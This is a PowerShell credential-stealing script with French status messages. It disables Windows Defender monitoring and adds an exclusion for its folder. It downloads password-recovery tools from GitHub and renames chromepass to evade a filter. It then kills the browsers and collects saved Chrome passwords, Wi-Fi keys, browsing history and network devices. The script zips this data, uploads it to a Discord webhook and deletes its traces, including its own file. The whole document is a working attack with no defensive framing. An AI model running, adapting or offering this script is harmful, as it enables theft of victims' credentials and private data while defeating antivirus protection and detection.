[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$webhookUrl
)

Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

Stop-Process -Name "cp", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
if (Test-Path $basePath) {
    Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
}

Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

New-Item -ItemType Directory -Path $basePath -Force | Out-Null
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
    # On télécharge chromepass mais on le renomme immédiatement en cp.exe pour contrer le filtre sur le nom
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\cp.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
    Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red
    exit 1
}

Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

Write-Host "[*] Lancement de cp.exe..." -ForegroundColor Yellow
$outputPath = "$basePath\passwords.txt"
"=== CREDENTIALS CHROME (EN CLAIR) ===" | Out-File -FilePath $outputPath -Encoding UTF8

if (Test-Path "$basePath\cp.exe") {
    Start-Process -FilePath "$basePath\cp.exe"
} else {
    Add-Content -Path $outputPath -Value "[!] Outil introuvable."
}

if (Test-Path "$basePath\WirelessKeyView.exe") {
    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\BrowsingHistoryView.exe") {
    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\WNetWatcher.exe") {
    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
}

Start-Sleep -Seconds 2

foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
    $filePath = "$basePath\$file"
    if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {
        Set-Content -Path $filePath -Value "No data captured"
    }
    Move-Item $filePath -Destination "$dumpFolder" -Force
}

Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

if (!(Test-Path $dumpFile)) { exit 1 }

Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")

$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))

try { 
    $client.PostAsync($webhookUrl,$content).Wait() 
    Write-Host "[+] Envoi reussi !" -ForegroundColor Green
} catch {
    Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
}

Stop-Process -Name "cp", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue
exit
